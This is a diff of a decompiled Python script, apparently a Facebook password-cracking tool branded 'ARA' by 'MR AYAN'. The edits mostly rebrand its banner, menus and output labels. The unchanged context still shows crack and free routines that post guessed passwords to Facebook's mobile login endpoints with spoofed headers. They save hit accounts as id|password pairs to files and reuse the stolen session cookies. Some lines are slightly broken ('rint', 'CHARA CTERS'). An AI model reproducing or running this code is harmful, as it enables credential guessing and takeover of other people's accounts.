@@ -1,5 +1,5 @@
 #DECOMPILE BY AYAN
-#FILE NAME (ARA-DEC)
+#FILE NAME (ARA -DEC)
 W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
@@ -315,7 +315,7 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;93m [ARAIN-OK ] {idf} | {pw}')
+				print( f'\r\x1b[1;93m [ARA-OK ] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [ARAIN-Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [ARA-Ok] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ARAIN-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ARA-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/ARAIN.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ARA.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -382,7 +382,7 @@ logo = """\033[1;30m
                   ▉▉▉▉
                  ▂▉▉▉▉▂
                 \033[1;33m╰▏ ┛┗ ▕╯
-                 ╲ 👅 ╱                                               
+                 ╲ 👅 ╱
                  \033[1;32m╱▔╲╱▔╲
                ╱ ╱▏╭╮▕╲ ╲
                ╲ ╲▏╭╮▕╱ ╱       
@@ -393,21 +393,23 @@ logo = """\033[1;30m
                 \033[1;31m ╭╰ ╮╭╰ ╮
                \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[0;92m █████╗    ██████╗     █████╗
-\033[0;31m ██╔══██╗   ██╔══██╗   ██╔══██╗
-\033[0;32m███████║   ██████╔╝   ███████║
-\033[0;33;m██╔══██║   ██╔══██╗   ██╔══██║
-\033[0;34m██║  ██║██╗██║  ██║██╗██║  ██║
-\033[0;35m╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝                             
+\033[0;92m
+\033[0;31m █████╗    ██████╗     █████╗ 
+\033[0;32m██╔══██╗   ██╔══██╗   ██╔══██╗
+\033[0;33m███████║   ██████╔╝   ███████║
+\033[0;34m██╔══██║   ██╔══██╗   ██╔══██║
+\033[0;35m██║  ██║██╗██║  ██║██╗██║  ██║
+\033[0;36m╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝                            
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR AYAN
-\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF ARA
+\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF ARA 
+\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mARA  TRICKER
 \033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mBAAP.HUN.TERA.MERY.BACHY
 \033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK ZONE 🙂🙈
 \033[1;39m━▷ \033[0;91m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;35mSTARTING EXIT SELECT AND JOIN
 \033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
 \033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0
-\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 AYAN 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 ARA
+\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 AYAN 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 𝘼RA
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
 class Main:
@@ -420,10 +422,10 @@ class Main:
 		print(logo)
 		
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
-		print("\033[1;37m     FIRST OF ALL JOIN MY GROUP")
+		print("\033[1;37m     FIRST OF ALL JOIN  MY GROUP")
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
 		
-		print(" \033[1;39m━▷\033[1;32m [1] JOIN THE GROUP FOR APPROVED")
+		print(" \033[1;39m━▷\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
 		print(" \033[1;39m━▷\033[1;31m [2] Exit")
 		print("")
 		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m━━> \033[1;32m")
@@ -437,7 +439,7 @@ class Main:
 			os.system("xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;37m    Type Your  Name")
+			print("\033[1;37m    Type Your ID Name")
 			print("")
 			input("\n\033[1;32m  Type Name \033[1;34m━━>  \033[1;33m")
 			time.sleep(2.1)
@@ -462,7 +464,7 @@ class Main:
 			os.system("xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
 			Public()
 		if MAINUL in ["3", "03"]:
-			os.system('xdg-open https://www.facebook.com/groups/726190969005614/?ref=share"  )
+			os.system('xdg-open  https://www.facebook.com/groups/726190969005614/?ref=share')
 		if MAINUL in ["4", "04"]:
 			os.system("xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN")
 			self.old()
@@ -492,7 +494,7 @@ class Main:
 				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARA CTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
@@ -923,7 +925,7 @@ class Main:
 				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARA CTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
